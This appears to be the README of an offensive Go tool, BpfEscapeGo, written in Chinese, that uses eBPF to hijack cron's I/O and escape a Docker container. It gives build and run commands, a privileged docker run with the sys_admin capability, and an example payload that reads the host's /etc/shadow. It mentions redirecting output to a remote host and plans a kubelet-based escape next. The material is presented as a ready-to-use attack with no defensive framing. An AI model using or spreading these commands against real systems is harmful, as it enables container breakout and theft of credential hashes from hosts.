# BpfEscapeGo
## 主要功能

使用 ebpf 程序劫持 cron 的 io 读写 进行容器逃逸

## 使用方式

### 直接使用主机
```bash
make build
sudo ./bpfescapego
```

### 使用容器的方式
```bash
docker run -it --cap-add sys_admin -v `pwd`:/tmp  ubuntu
# copy `bpfescapego` binary to container
./bpfescapego "cat /etc/shadow > /tmp/hello"
```

下图是展示将输出重定向到远程主机的操作

![输出重定向到远程接收图片](https://github.com/awslshadowstar/BpfEscapeGo/assets/52888924/6039130a-b8f4-430f-a2e4-3485ffa5427e)

### TODO list
劫持 kubelet 实现容器逃逸